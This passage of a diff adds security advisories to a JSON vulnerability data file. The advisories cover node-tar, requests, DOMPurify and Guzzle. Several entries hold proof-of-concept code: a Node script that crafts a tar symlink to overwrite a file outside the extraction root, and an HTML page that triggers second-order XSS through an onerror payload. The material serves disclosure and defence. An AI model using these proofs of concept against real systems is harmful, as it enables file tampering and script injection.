'ORIGINAL\\n')\n\nconst b = Buffer.alloc(1536)\nnew Header({\n  path: 'a/b/l',\n  type: 'SymbolicLink',\n  linkpath: 'C:../../../target.txt',\n}).encode(b, 0)\nfs.writeFileSync(tarFile, b)\n\nx({ cwd, file: tarFile }).then(() =\u003e {\n  fs.writeFileSync(path.join(cwd, 'a/b/l'), 'PWNED\\n')\n  process.stdout.write(fs.readFileSync(target, 'utf8'))\n})\n```\n\nRun:\n\n```bash\nnode poc.cjs \u0026\u0026 readlink a/b/l \u0026\u0026 ls -l a/b/l ../target.txt\n```\n\nObserved output:\n\n```text\nPWNED\n../../../target.txt\nlrwxrwxrwx - joshuavr  7 Mar 18:37 󰡯 a/b/l -\u003e ../../../target.txt\n.rw-r--r-- 6 joshuavr  7 Mar 18:37  ../target.txt\n```\n\n`PWNED` confirms outside file content overwrite. `readlink` and `ls -l` confirm the extracted symlink points outside the extraction directory.\n\n### Impact\nThis is an arbitrary file overwrite primitive outside the intended extraction root, with the permissions of the process performing extraction.\n\nRealistic scenarios:\n- CLI tools unpacking untrusted tarballs into a working directory\n- build/update pipelines consuming third-party archives\n- services that import user-supplied tar files",
+      "advisories": [
+        {
+          "url": "https://nvd.nist.gov/vuln/detail/CVE-2026-31802"
+        }
+      ],
+      "published": "2026-03-10T23:44:58Z",
+      "updated": "2026-03-13T04:44:43Z",
+      "credits": {
+        "organizations": []
+      },
+      "affects": [
+        {
+          "ref": "pkg:npm/tar"
+        }
+      ]
+    },
+    {
+      "id": "GHSA-9wx4-h78v-vm56",
+      "references": [
+        {
+          "id": "CVE-2024-35195",
+          "source": {}
+        },
+        {
+          "id": "PYSEC-2026-1873",
+          "source": {}
+        }
+      ],
+      "ratings": [
+        {
+          "method": "CVSSv3",
+          "vector": "CVSS:3.1/AV:L/AC:H/PR:H/UI:R/S:U/C:H/I:H/A:N"
+        }
+      ],
+      "description": "Requests `Session` object does not verify requests after making first request with verify=False",
+      "detail": "When using a `requests.Session`, if the first request to a given origin is made with `verify=False`, TLS certificate verification may remain disabled for all subsequent requests to that origin, even if `verify=True` is explicitly specified later.\n\nThis occurs because the underlying connection is reused from the session's connection pool, causing the initial TLS verification setting to persist for the lifetime of the pooled connection. As a result, applications may unintentionally send requests without certificate verification, leading to potential man-in-the-middle attacks and compromised confidentiality or integrity.\n\nThis behavior affects versions of `requests` prior to 2.32.0.",
+      "advisories": [
+        {
+          "url": "https://nvd.nist.gov/vuln/detail/CVE-2024-35195"
+        }
+      ],
+      "published": "2024-05-20T20:15:00Z",
+      "updated": "2026-07-07T17:57:17Z",
+      "credits": {
+        "organizations": []
+      },
+      "affects": [
+        {
+          "ref": "pkg:pypi/requests"
+        }
+      ]
+    },
+    {
+      "id": "GHSA-c2j3-45gr-mqc4",
+      "references": [],
+      "ratings": [
+        {
+          "method": "CVSSv4",
+          "vector": "CVSS:4.0/AV:N/AC:H/AT:N/PR:N/UI:A/VC:N/VI:N/VA:N/SC:L/SI:L/SA:N"
+        }
+      ],
+      "description": "DOMPurify: `CUSTOM_ELEMENT_HANDLING` bypasses `afterSanitizeElements` for allowed custom elements.",
+      "detail": "## Summary\n\nThere is a possible hook-policy inconsistency in DOMPurify 3.4.11 involving `CUSTOM_ELEMENT_HANDLING`.\n\nWhen a custom element is allowed via `CUSTOM_ELEMENT_HANDLING.tagNameCheck`, it appears that the element does not go through `afterSanitizeElements` in the same way as a normal element. As a result, an application that relies on `afterSanitizeElements` as a security policy layer to strip sensitive attributes from all elements may see those attributes removed from normal elements but preserved on allowed custom elements.\n\nThis does not appear to be a direct DOMPurify XSS or a case where DOMPurify directly allows executable payloads. The preserved value is still inert at sanitize time. The issue becomes relevant when the allowed custom element later re-injects that attribute value into an HTML sink such as `innerHTML`, creating a second-order XSS gadget.\n\n## Details\n\nThe issue appears to originate from the control flow in `src/purify.ts`: line 1672~1691\n\n```tsx\nconst _sanitizeDisallowedNode = function (\n    currentNode: any,\n    tagName: string\n  ): boolean {\n    /* Check if we have a custom element to handle */\n    if (!FORBID_TAGS[tagName] \u0026\u0026 _isBasicCustomElement(tagName)) {\n      if (\n        CUSTOM_ELEMENT_HANDLING.tagNameCheck instanceof RegExp \u0026\u0026\n        regExpTest(CUSTOM_ELEMENT_HANDLING.tagNameCheck, tagName)\n      ) {\n        return false;\n      }\n\n      if (\n        CUSTOM_ELEMENT_HANDLING.tagNameCheck instanceof Function \u0026\u0026\n        CUSTOM_ELEMENT_HANDLING.tagNameCheck(tagName)\n      ) {\n        return false;\n      }\n    }\n```\n\n`CUSTOM_ELEMENT_HANDLING` is parsed from user configuration at `src/purify.ts`: line 741~748\n\n```tsx\nconst customElementHandling =\n      objectHasOwnProperty(cfg, 'CUSTOM_ELEMENT_HANDLING') \u0026\u0026\n      cfg.CUSTOM_ELEMENT_HANDLING \u0026\u0026\n      typeof cfg.CUSTOM_ELEMENT_HANDLING === 'object'\n        ? clone(cfg.CUSTOM_ELEMENT_HANDLING)\n        : create(null);\n\n    CUSTOM_ELEMENT_HANDLING = create(null);\n```\n\nIn particular, `tagNameCheck`, `attributeNameCheck`, and `allowCustomizedBuiltInElements` are copied into the internal `CUSTOM_ELEMENT_HANDLING` object there.\n\nDuring element sanitization, `_sanitizeElements()` checks whether a node is forbidden or not allowlisted at `src/purify.ts`: line 1805~1814\n\n```tsx\n/* Remove element if anything forbids its presence */\n    if (\n      FORBID_TAGS[tagName] ||\n      (!(\n        EXTRA_ELEMENT_HANDLING.tagCheck instanceof Function \u0026\u0026\n        EXTRA_ELEMENT_HANDLING.tagCheck(tagName)\n      ) \u0026\u0026\n        !ALLOWED_TAGS[tagName])\n    ) {\n      return _sanitizeDisallowedNode(currentNode, tagName);\n    }\n```\n\nIf so, it immediately delegates to `_sanitizeDisallowedNode(currentNode, tagName)` and returns its boolean result.\n\nInside `_sanitizeDisallowedNode()`, the custom-element-specific allow path is implemented at `src/purify.ts`: line 1672~1692\n\n```tsx\nconst _sanitizeDisallowedNode = function (\n    currentNode: any,\n    tagName: string\n  ): boolean {\n    /* Check if we have a custom element to handle */\n    if (!FORBID_TAGS[tagName] \u0026\u0026 _isBasicCustomElement(tagName)) {\n      if (\n        CUSTOM_ELEMENT_HANDLING.tagNameCheck instanceof RegExp \u0026\u0026\n        regExpTest(CUSTOM_ELEMENT_HANDLING.tagNameCheck, tagName)\n      ) {\n        return false;\n      }\n\n      if (\n        CUSTOM_ELEMENT_HANDLING.tagNameCheck instanceof Function \u0026\u0026\n        CUSTOM_ELEMENT_HANDLING.tagNameCheck(tagName)\n      ) {\n        return false;\n      }\n    }\n```\n\nIf the node is treated as a basic custom element and `CUSTOM_ELEMENT_HANDLING.tagNameCheck` matches, the function returns `false` immediately at line 1682 or 1689, meaning “do not remove this node”.\n\nThat early `return false` is significant because control returns directly to `_sanitizeElements()` via the `return _sanitizeDisallowedNode(...)` at line 1813. As a result, the later logic in `_sanitizeElements()` is skipped for that custom element instance, including:\n\n- the namespace validation at `src/purify.ts`: line 1816~1826\n\n```tsx\n* Check whether element has a valid namespace.\n       Realm-safe check (GHSA-hpcv-96wg-7vj8): use the cached Node.prototype\n       nodeType getter rather than `instanceof Element`, which is realm-\n       bound and short-circuits to false for any node minted in a different\n       realm — letting a foreign-realm element with a forbidden namespace\n       slip past the namespace check entirely. */\n    const nt = getNodeType ? getNodeType(currentNode) : currentNode.nodeType;\n    if (nt === NODE_TYPE.element \u0026\u0026 !_checkValidNamespace(currentNode)) {\n      _forceRemove(currentNode);\n      return true;\n    }\n```\n\n- the fallback-tag mXSS check at `src/purify.ts`: line 1828~1837\n\n```tsx\n/* Make sure that older browsers don't get fallback-tag mXSS */\n    if (\n      (tagName === 'noscript' ||\n        tagName === 'noembed' ||\n        tagName === 'noframes') \u0026\u0026\n      regExpTest(EXPRESSIONS.FALLBACK_TAG_CLOSE, currentNode.innerHTML)\n    ) {\n      _forceRemove(currentNode);\n      return true;\n    }\n```\n\n- most importantly for this report, the `afterSanitizeElements` hook dispatch at `src/purify.ts`: line 1850~1851.\n\n```tsx\n   /* Execute a hook if present */\n    _executeHooks(hooks.afterSanitizeElements, currentNode, null);\n```\n\nIn other words, a normal allowlisted element continues through `_sanitizeElements()` and reaches `hooks.afterSanitizeElements`, but a disallowed-by-default element that is revived by the `CUSTOM_ELEMENT_HANDLING.tagNameCheck` path does not. This creates a policy inconsistency: an application that relies on `afterSanitizeElements` to remove an attribute from all elements will observe that the policy is applied to normal elements but not to custom elements allowed through `CUSTOM_ELEMENT_HANDLING`.\n\nIn the PoC, the application hook removes `data-bio` from ordinary elements, but the same attribute remains on `\u003cx-bio\u003e` because the custom-element keep path bypasses `afterSanitizeElements`. The attribute itself is inert at sanitize time and DOMPurify is not directly allowing executable SVG/HTML through. The security impact appears when the application-defined custom element later reads the preserved `data-bio` value in `connectedCallback()` and writes it to `innerHTML`, turning the preserved attribute into a second-order XSS gadget.\n\n## PoC\n\nReproduced on DOMPurify 3.4.11.\n\n### Steps\n\n1. Save the following HTML to a file, for example `poc.html`.\n2. Open it in a browser.\n3. Observe that the `div` control loses `data-bio`, while the allowed custom element keeps it.\n4. Observe that after `connectedCallback()` runs, the candidate payload is reinserted into the DOM and executes through the custom element’s own sink.\n\n### HTML PoC\n\n```html\n\u003c!DOCTYPE html\u003e\n\u003chtml\u003e\n\u003chead\u003e\n  \u003cmeta charset=\"UTF-8\"\u003e\n  \u003cscript src=\"https://cdnjs.cloudflare.com/ajax/libs/dompurify/3.4.11/purify.min.js\"\u003e\u003c/script\u003e\n\u003c/head\u003e\n\u003cbody\u003e\n\u003cpre id=\"result\"\u003e\u003c/pre\u003e\n\n\u003cscript\u003e\nwindow.__controlFired = false;\nwindow.__candidateFired = false;\n\ncustomElements.define(\"x-bio\", class extends HTMLElement {\n  connectedCallback() {\n    const bio = this.getAttribute(\"data-bio\");\n    if (bio) this.innerHTML = bio;\n  }\n});\n\nDOMPurify.addHook(\"afterSanitizeElements\", node =\u003e {\n  if (node.hasAttribute \u0026\u0026 node.hasAttribute(\"data-bio\")) {\n    node.removeAttribute(\"data-bio\");\n  }\n});\n\nconst config = {\n  CUSTOM_ELEMENT_HANDLING: {\n    tagNameCheck: /^x-/\n  }\n};\n\nconst controlInput =\n  '\u003cdiv data-bio=\"\u0026lt;img src=x onerror=window.__controlFired=true\u0026gt;\"\u003e\u003c/div\u003e';\n\nconst candidateInput =\n  '\u003cx-bio data-bio=\"\u0026lt;img src=x onerror=window.__candidateFired=true\u0026gt;\"\u003e\u003c/x-bio\u003e';\n\nconst cleanControl = DOMPurify.sanitize(controlInput, config);\nconst cleanCandidate = DOMPurify.sanitize(candidateInput, config);\n\nconst container = document.createElement(\"div\");\ncontainer.innerHTML = cleanCandidate;\ndocument.body.appendChild(container);\n\nsetTimeout(() =\u003e {\n  document.getElementById(\"result\").textContent =\n    \"This is not direct DOMPurify XSS.\\n\" +\n    \"The payload becomes executable only after x-bio writes data-bio into innerHTML.\\n\\n\" +\n    \"control: \" + cleanControl + \"\\n\" +\n    \"candidate: \" + cleanCandidate + \"\\n\" +\n    \"after connectedCallback: \" + container.innerHTML + \"\\n\" +\n    \"control fired: \" + window.__controlFired + \"\\n\" +\n    \"candidate fired: \" + window.__candidateFired;\n}, 100);\n\u003c/script\u003e\n\u003c/body\u003e\n\u003c/html\u003e\n```\n\n### Expected result\n\n```\ncontrol: \u003cdiv\u003e\u003c/div\u003e\ncandidate: \u003cx-bio data-bio=\"\u003cimg src=x onerror=window.__candidateFired=true\u003e\"\u003e\u003c/x-bio\u003e\nafter connectedCallback: \u003cx-bio data-bio=\"...\"\u003e\u003cimg src=\"x\" onerror=\"window.__candidateFired=true\"\u003e\u003c/x-bio\u003e\ncontrol fired: false\ncandidate fired: true\n```\n\nThis is output of HTML PoC.\n\n\u003cimg width=\"1917\" height=\"961\" alt=\"poc\" src=\"https://github.com/user-attachments/assets/80e22989-5779-42f8-8ffb-106e9a4c2b10\" /\u003e\n\n\n## Impact\n\nThis does not appear to affect DOMPurify’s default configuration as a direct sanitizer bypass.\n\nThe impact is limited to applications that:\n\n- enable `CUSTOM_ELEMENT_HANDLING`,\n- rely on `afterSanitizeElements` as a security policy layer,\n- expect that hook to apply uniformly to all surviving elements,\n- and have allowed custom elements that later re-inject preserved attribute values into `innerHTML` or another HTML sink.\n\nIn that situation, the behavior can become a second-order XSS gadget because a security-relevant attribute is removed from normal elements but remains on allowed custom elements.\n\nPossible fixes or mitigations might include\n\n- ensuring that allowed custom elements also consistently pass through `afterSanitizeElements`\n- documenting clearly that elements preserved via `CUSTOM_ELEMENT_HANDLING` may not participate in the same post-element hook flow as normal allowlisted elements.",
+      "advisories": [],
+      "published": "2026-07-21T19:41:07Z",
+      "updated": "2026-07-21T19:45:25Z",
+      "credits": {
+        "organizations": []
+      },
+      "affects": [
+        {
+          "ref": "pkg:npm/dompurify"
+        }
+      ]
+    },
+    {
+      "id": "GHSA-c2w2-prh8-qm98",
+      "references": [
+        {
+          "id": "CVE-2026-59882",
+          "source": {}
+        }
+      ],
+      "ratings": [
+        {
+          "method": "CVSSv3",
+          "vector": "CVSS:3.1/AV:N/AC:H/PR:N/UI:R/S:U/C:L/I:L/A:N"
+        }
+      ],
+      "description": "guzzlehttp/psr7: Host Confusion via Weak URI Host Validation",
+      "detail": "### Impact\n\n`guzzlehttp/psr7` did not reject URI host components containing authority delimiters (`/`, `?`, `#`, `@`, or `\\`), an embedded port such as `host:8080`, or IPv6 brackets that do not frame the host (such as `[::1` or `::1]`). `Uri::assertValidHost()` rejected only control characters, so these malformed hosts were accepted both when parsing a URI string — including through `new Uri()`, an absolute-form request target passed to `Message::parseRequest()`, and the synthetic `SERVER_NAME` or `SERVER_ADDR` fallback used by `ServerRequest::fromGlobals()` — and when setting a host with `Uri::withHost()`. Because the stored host was not validated, `Uri::getHost()` could return a value that does not agree with the URI's authority or with the host that is actually used on the wire. For example, `Uri::withHost('good.com@evil.com')` is accepted, and `new Uri('http://[gggg::1]/')` produces a `getHost()` of `'[gggg:'` while `getAuthority()` returns `'[gggg::1'`.\n\nYou are affected if your application builds a `Uri` or calls `Uri::withHost()` with host data that is wholly or partly attacker-controlled and then relies on `Uri::getHost()` for a security or routing decision, such as host allowlisting or denylisting, an SSRF guard, cookie scoping, or proxy-bypass selection. You are also affected if you parse, forward, proxy, or re-serialize URIs that come from untrusted raw HTTP messages or from synthetic `$_SERVER` values. Because `getHost()` can then disagree with the real connection target, the concrete impact depends on how your application and any downstream HTTP/1.x component use the URI, and may include host-based access-control bypass, server-side request forgery, routing to an unintended host, or `Host` header confusion. You are not affected if every host you place into a `Uri` is already trusted and well formed.\n\nApplications using `guzzlehttp/guzzle` are affected in the same way through Guzzle's use of PSR-7. Guzzle derives the request `Host` header from the request URI, and its cookie matching and `no_proxy` proxy-bypass matching both read `Uri::getHost()`. An application that builds a Guzzle request URI from attacker-controlled host input can therefore have its `Host` header, cookie scope, or proxy-bypass decision computed against a host that differs from the one Guzzle connects to. This is not the normal request-sending path, and an application that passes only trusted, well-formed URIs to Guzzle and never builds a request URI from attacker-controlled host input is not affected through Guzzle's standard client APIs.\n\n### Patches\n\nThe issue is patched in `2.12.3` and later. Starting in that release, `guzzlehttp/psr7` rejects URI host components that contain authority delimiters, an embedded port, or IPv6 brackets that do not frame the host, both when parsing a URI and via `Uri::withHost()`, so `Uri::getHost()` agrees with the URI authority. A framed bracketed literal whose contents are not a valid IPv6 address is preserved rather than rejected, so `getHost()` still agrees with the authority.\n\n### Workarounds\n\nIf you cannot upgrade immediately, validate and normalize host values before you build or modify a `Uri` from untrusted input, and do not treat `Uri::getHost()` as a trust boundary for a host you have not independently checked. Before passing a host to `Uri`, reject any value that contains `/`, `?`, `#`, `@`, or `\\`, that contains a colon outside a bracketed IPv6 literal, or that has unbalanced brackets. Applications that parse, forward, replay, or re-serialize raw HTTP messages, or that run with attacker-controlled `$_SERVER` values, should validate the host before calling `Message::parseRequest()` or `ServerRequest::fromGlobals()`, and should avoid reparsing untrusted input.\n\n### References\n\n* https://datatracker.ietf.org/doc/html/rfc3986#section-3.2.2\n* https://datatracker.ietf.org/doc/html/rfc3986#section-3.2.3\n* https://datatracker.ietf.org/doc/html/rfc6265#section-5.1.3",
+      "advisories": [
+        {
+          "url": "https://nvd.nist.gov/vuln/detail/CVE-2026-59882"
+        }
+      ],
+      "published": "2026-07-21T18:35:25Z",
+      "updated": "2026-07-21T18:46:10Z",
+      "credits": {
+        "organizations": []
+      },
+      "affects": [
+        {
+          "ref": "pkg:composer/guzzlehttp/psr7"
+        }
+      ]
+    },
+    {
+      "id": "GHSA-f283-ghqc-fg79",
+      "references": [],
+      "ratings": [
+        {
+          "method": "CVSSv3",
+          "vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:L"
+        }
+      ],
+      "description": "Guzzle: Unbounded response cookies risk denial of service",
+      "detail": "### Impact\n\nIn affected versions, Guzzle's built-in `CookieJar` accepts any number of `Set-Cookie` header fields from one response, with no limit on the size of each field. When a later request matches the stored cookies, Guzzle places every match into one generated `Cookie` header without limiting the number of cookies or the total header length.\n\nA malicious or compromised server can therefore return many large cookies, causing Guzzle to store attacker-controlled data in memory and copy it into later request headers. This can increase memory use and processing time. It can also make later requests fail when the generated header exceeds a limit in a handler, HTTP implementation, proxy, or destination server. A server on one sibling host, such as `attacker.example.com`, can also set parent-domain cookies that are later selected for another sibling, such as `service.example.com`. The denial can therefore affect a different service that uses the same jar.\n\nAn application is affected when it enables the built-in cookie support, receives an attacker-controlled response, and retains or reuses the jar. The issue affects both built-in handlers because Guzzle manages these cookies itself instead of using libcurl's native cookie engine. cURL addressed a similar denial-of-service issue in CVE-2022-32205 by limiting the cookies it accepts and sends, but those native limits do not protect Guzzle's separate jar. Applications that do not use cookies, use separate jars for untrusted origins, or use a third-party `CookieJarInterface` with suitable limits are not affected by this behavior. The demonstrated direct impact is limited to availability. The patch does not impose a lifetime limit on a jar built up over an unlimited number of responses or populated directly by application code.\n\n### Patches\n\nThe issue is patched in `7.15.1` and later. Starting in that release, the built-in `CookieJar` ignores a `Set-Cookie` field value longer than 8,190 bytes and applies at most 50 successful cookie insertions or replacements from one response. When generating a request, it emits at most 150 matching `name=value` pairs and limits the complete `Cookie: ` header line to 8,190 bytes, including the field name and following space.\n\nThese limits follow the same practical shape as cURL's response to CVE-2022-32205. Both bound cookies accepted from one response, cookies added to one request, and generated header size. Guzzle's 8,190-byte incoming field limit is more generous than cURL's current 5,000-byte cookie-line limit. Neither approach adds a global jar quota or an eviction policy. The 8,190-byte incoming boundary is inclusive. Invalid, unrelated, identical, oversized, and deletion fields do not consume the 50-cookie limit. For outgoing requests, Guzzle preserves its existing matching and iteration order. It stops after 150 pairs or before the first matching cookie that would exceed the line limit. The output limits also apply to directly imported cookie state, but that state is not limited when it is added to the jar. Explicit caller-supplied `Cookie` headers and third-party jar implementations remain the caller's responsibility. Versions before `7.15.1` are affected.\n\n### Workarounds\n\nIf you cannot upgrade immediately, do not enable a shared built-in cookie jar for requests to untrusted origins. Use separate jars per host or trust boundary, disable cookie handling for untrusted requests, and discard or clear a jar after receiving an untrusted response before it is reused. Applications that must accept cookies from untrusted peers can provide a custom `CookieJarInterface` implementation that enforces suitable limits.\n\nGuzzle does not use libcurl's cookie engine for cookies stored in a `CookieJar`. The cURL handler sends the `Cookie` header that Guzzle's cookie middleware has already built, so libcurl's cookie limits do not apply. Upgrading libcurl therefore does not fix this issue.\n\n### References\n\n* https://curl.se/docs/CVE-2022-32205.html\n* https://www.rfc-editor.org/rfc/rfc10025.html#section-5.7\n* https://www.rfc-editor.org/rfc/rfc10025.html#section-5.8.3\n* https://www.rfc-editor.org/rfc/rfc10025.html#section-6.1",
+      "advisories": [],
+      "published": "2026-07-20T23:27:02Z",
+      "updated": "2026-07-21T20:59:35Z",
+      "credits": {
+        "organizations": []
+      },
+      "affects": [
+        {
+          "ref": "pkg:composer/guzzlehttp/guzzle"
+        }
+      ]
+    },
+    {
+      "id": "GHSA-f5x3-32g6-xq36",
+      "references": [
+        {
+          "id": "CVE-2024-28863",
+          "source": {}
+        }
+      ],
+      "ratings": [
+        {
+          "method": "CVSSv3",
+          "vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:U/C:N/I:N/A:H"
+        }
+      ],
+      "description": "Denial of service while parsing a tar file due to lack of folders count validation",
+      "detail": "## Description: \nDuring some analysis today on npm's `node-tar` package I came across the folder creation process, Basicly if you provide node-tar with a path like this `./a/b/c/foo.txt` it would create every folder and sub-folder here a, b and c until it reaches the last folder to create `foo.txt`, In-this case I noticed that there's no validation at all on the amount of folders being created, that said we're actually able to CPU and memory consume the system running node-tar and even crash the nodejs client within few seconds of running it using a path with too many sub-folders inside\n\n## Steps To Reproduce:\nYou can reproduce this issue by downloading the tar file I provided in the resources and using node-tar to extract it, you should get the same behavior as the video\n\n## Proof Of Concept:\nHere's a [video](https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/3i7uojw8s52psar6pg8zkdo4h9io?response-content-disposition=attachment%3B%20filename%3D%22tar-dos-poc.webm%22%3B%20filename%2A%3DUTF-8%27%27tar-dos-poc.webm\u0026response-content-type=video%2Fwebm\u0026X-Amz-Algorithm=AWS4-HMAC-SHA256\u0026X-Amz-Credential=ASIAQGK6FURQSWWGDXHA%2F20240312%2Fus-west-2%2Fs3%2Faws4_request\u0026X-Amz-Date=20240312T080103Z\u0026X-Amz-Expires=3600\u0026X-Amz-Security-Token=IQoJb3JpZ2luX2VjEDcaCXVzLXdlc3QtMiJHMEUCID3xYDc6emXVPOg8iVR5dVk0u3gguTPIDJ0OIE%2BKxj17AiEAi%2BGiay1gGMWhH%2F031fvMYnSsa8U7CnpZpxvFAYqNRwgqsQUIQBADGgwwMTM2MTkyNzQ4NDkiDAaj6OgUL3gg4hhLLCqOBUUrOgWSqaK%2FmxN6nKRvB4Who3LIyzswFKm9LV94GiSVFP3zXYA480voCmAHTg7eBL7%2BrYgV2RtXbhF4aCFMCN3qu7GeXkIdH7xwVMi9zXHkekviSKZ%2FsZtVVjn7RFqOCKhJl%2FCoiLQJuDuju%2FtfdTGZbEbGsPgKHoILYbRp81K51zeRL21okjsOehmypkZzq%2BoGrXIX0ynPOKujxw27uqdF4T%2BF9ynodq01vGgwgVBEjHojc4OKOfr1oW5b%2FtGVV59%2BOBVI1hqIKHRG0Ed4SWmp%2BLd1hazGuZPvp52szmegnOj5qr3ubppnKL242bX%2FuAnQKzKK0HpwolqXjsuEeFeM85lxhqHV%2B1BJqaqSHHDa0HUMLZistMRshRlntuchcFQCR6HBa2c8PSnhpVC31zMzvYMfKsI12h4HB6l%2FudrmNrvmH4LmNpi4dZFcio21DzKj%2FRjWmxjH7l8egDyG%2FIgPMY6Ls4IiN7aR1jijYTrBCgPUUHets3BFvqLzHtPFnG3B7%2FYRPnhCLu%2FgzvKN3F8l38KqeTNMHJaxkuhCvEjpFB2SJbi2QZqZZbLj3xASqXoogzbsyPp0Tzp0tH7EKDhPA7H6wwiZukXfFhhlYzP8on9fO2Ajz%2F%2BTDkDjbfWw4KNJ0cFeDsGrUspqQZb5TAKlUge7iOZEc2TZ5uagatSy9Mg08E4nImBSE5QUHDc7Daya1gyqrETMDZBBUHH2RFkGA9qMpEtNrtJ9G%2BPedz%2FpPY1hh9OCp9Pg1BrX97l3SfVzlAMRfNibhywq6qnE35rVnZi%2BEQ1UgBjs9jD%2FQrW49%2FaD0oUDojVeuFFryzRnQxDbKtYgonRcItTvLT5Y0xaK9P0u6H1197%2FMk3XxmjD9%2Fb%2BvBjqxAQWWkKiIxpC1oHEWK9Jt8UdJ39xszDBGpBqjB6Tvt5ePAXSyX8np%2FrBi%2BAPx06O0%2Ba7pU4NmH800EVXxxhgfj9nMw3CeoUIdxorVKtU2Mxw%2FLaAiPgxPS4rqkt65NF7eQYfegcSYDTm2Z%2BHPbz9HfCaVZ28Zqeko6sR%2F29ML4bguqVvHAM4mWPLNDXH33mjG%2BuzLi8e1BF7tNveg2X9G%2FRdcMkojwKYbu6xN3M6aX2alQg%3D%3D\u0026X-Amz-SignedHeaders=host\u0026X-Amz-Signature=1e8235d885f1d61529b7d6b23ea3a0780c300c91d86e925dd8310d5b661ddbe2) show-casing the exploit: \n\n## Impact\n\nDenial of service by crashing the nodejs client when attempting to parse a tar archive, make it run out of heap memory and consuming server CPU and memory resources\n\n## Report resources\n[payload.txt](https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/1e83ayb5dd3350fvj3gst0mqixwk?response-content-disposition=attachment%3B%20filename%3D%22payload.txt%22%3B%20filename%2A%3DUTF-8%27%27payload.txt\u0026response-content-type=text%2Fplain\u0026X-Amz-Algorithm=AWS4-HMAC-SHA256\u0026X-Amz-Credential=ASIAQGK6FURQSWWGDXHA%2F20240312%2Fus-west-2%2Fs3%2Faws4_request\u0026X-Amz-Date=20240312T080103Z\u0026X-Amz-Expires=3600\u0026X-Amz-Security-Token=IQoJb3JpZ2luX2VjEDcaCXVzLXdlc3QtMiJHMEUCID3xYDc6emXVPOg8iVR5dVk0u3gguTPIDJ0OIE%2BKxj17AiEAi%2BGiay1gGMWhH%2F031fvMYnSsa8U7CnpZpxvFAYqNRwgqsQUIQBADGgwwMTM2MTkyNzQ4NDkiDAaj6OgUL3gg4hhLLCqOBUUrOgWSqaK%2FmxN6nKRvB4Who3LIyzswFKm9LV94GiSVFP3zXYA480voCmAHTg7eBL7%2BrYgV2RtXbhF4aCFMCN3qu7GeXkIdH7xwVMi9zXHkekviSKZ%2FsZtVVjn7RFqOCKhJl%2FCoiLQJuDuju%2FtfdTGZbEbGsPgKHoILYbRp81K51zeRL21okjsOehmypkZzq%2BoGrXIX0ynPOKujxw27uqdF4T%2BF9ynodq01vGgwgVBEjHojc4OKOfr1oW5b%2FtGVV59%2BOBVI1hqIKHRG0Ed4SWmp%2BLd1hazGuZPvp52szmegnOj5qr3ubppnKL242bX%2FuAnQKzKK0HpwolqXjsuEeFeM85lxhqHV%2B1BJqaqSHHDa0HUMLZistMRshRlntuchcFQCR6HBa2c8PSnhpVC31zMzvYMfKsI12h4HB6l%2FudrmNrvmH4LmNpi4dZFcio21DzKj%2FRjWmxjH7l8egDyG%2FIgPMY6Ls4IiN7aR1jijYTrBCgPUUHets3BFvqLzHtPFnG3B7%2FYRPnhCLu%2FgzvKN3F8l38KqeTNMHJaxkuhCvEjpFB2SJbi2QZqZZbLj3xASqXoogzbsyPp0Tzp0tH7EKDhPA7H6wwiZukXfFhhlYzP8on9fO2Ajz%2F%2BTDkDjbfWw4KNJ0cFeDsGrUspqQZb5TAKlUge7iOZEc2TZ5uagatSy9Mg08E4nImBSE5QUHDc7Daya1gyqrETMDZBBUHH2RFkGA9qMpEtNrtJ9G%2BPedz%2FpPY1hh9OCp9Pg1BrX97l3SfVzlAMRfNibhywq6qnE35rVnZi%2BEQ1UgBjs9jD%2FQrW49%2FaD0oUDojVeuFFryzRnQxDbKtYgonRcItTvLT5Y0xaK9P0u6H1197%2FMk3XxmjD9%2Fb%2BvBjqxAQWWkKiIxpC1oHEWK9Jt8UdJ39xszDBGpBqjB6Tvt5ePAXSyX8np%2FrBi%2BAPx06O0%2Ba7pU4NmH800EVXxxhgfj9nMw3CeoUIdxorVKtU2Mxw%2FLaAiPgxPS4rqkt65NF7eQYfegcSYDTm2Z%2BHPbz9HfCaVZ28Zqeko6sR%2F29ML4bguqVvHAM4mWPLNDXH33mjG%2BuzLi8e1BF7tNveg2X9G%2FRdcMkojwKYbu6xN3M6aX2alQg%3D%3D\u0026X-Amz-SignedHeaders=host\u0026X-Amz-Signature=bad9fe731f05a63a950f99828125653a8c1254750fe0ca7be882e89ecdd449ae)\n[archeive.tar.gz](https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/ymkuh4xnfdcf1soeyi7jc2x4yt2i?response-content-disposition=attachment%3B%20filename%3D%22archive.tar.gz%22%3B%20filename%2A%3DUTF-8%27%27archive.tar.gz\u0026response-content-type=application%2Fx-tar\u0026X-Amz-Algorithm=AWS4-HMAC-SHA256\u0026X-Amz-Credential=ASIAQGK6FURQSWWGDXHA%2F20240312%2Fus-west-2%2Fs3%2Faws4_request\u0026X-Amz-Date=20240312T080103Z\u0026X-Amz-Expires=3600\u0026X-Amz-Security-Token=IQoJb3JpZ2luX2VjEDcaCXVzLXdlc3QtMiJHMEUCID3xYDc6emXVPOg8iVR5dVk0u3gguTPIDJ0OIE%2BKxj17AiEAi%2BGiay1gGMWhH%2F031fvMYnSsa8U7CnpZpxvFAYqNRwgqsQUIQBADGgwwMTM2MTkyNzQ4NDkiDAaj6OgUL3gg4hhLLCqOBUUrOgWSqaK%2FmxN6nKRvB4Who3LIyzswFKm9LV94GiSVFP3zXYA480voCmAHTg7eBL7%2BrYgV2RtXbhF4aCFMCN3qu7GeXkIdH7xwVMi9zXHkekviSKZ%2FsZtVVjn7RFqOCKhJl%2FCoiLQJuDuju%2FtfdTGZbEbGsPgKHoILYbRp81K51zeRL21okjsOehmypkZzq%2BoGrXIX0ynPOKujxw27uqdF4T%2BF9ynodq01vGgwgVBEjHojc4OKOfr1oW5b%2FtGVV59%2BOBVI1hqIKHRG0Ed4SWmp%2BLd1hazGuZPvp52szmegnOj5qr3ubppnKL242bX%2FuAnQKzKK0HpwolqXjsuEeFeM85lxhqHV%2B1BJqaqSHHDa0HUMLZistMRshRlntuchcFQCR6HBa2c8PSnhpVC31zMzvYMfKsI12h4HB6l%2FudrmNrvmH4LmNpi4dZFcio21DzKj%2FRjWmxjH7l8egDyG%2FIgPMY6Ls4IiN7aR1jijYTrBCgPUUHets3BFvqLzHtPFnG3B7%2FYRPnhC